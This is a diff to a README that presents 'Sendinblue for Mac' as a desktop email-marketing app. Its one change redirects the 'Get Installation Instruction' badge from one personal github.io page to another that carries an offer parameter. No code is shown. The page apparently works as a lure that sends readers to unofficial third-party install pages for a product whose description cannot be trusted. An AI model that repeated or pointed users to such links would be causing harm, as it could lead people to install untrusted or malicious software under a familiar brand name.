@@ -3,7 +3,7 @@
 
 Sendinblue for Mac provides a professional **desktop platform for email marketing and automation** on MacOS. Manage campaigns, automate workflows, and track subscriber engagement directly from your Mac desktop. Follow the instructions below to get started today. 📧  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://muffinsun2005.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=Sendinblue)
 
 ---
 
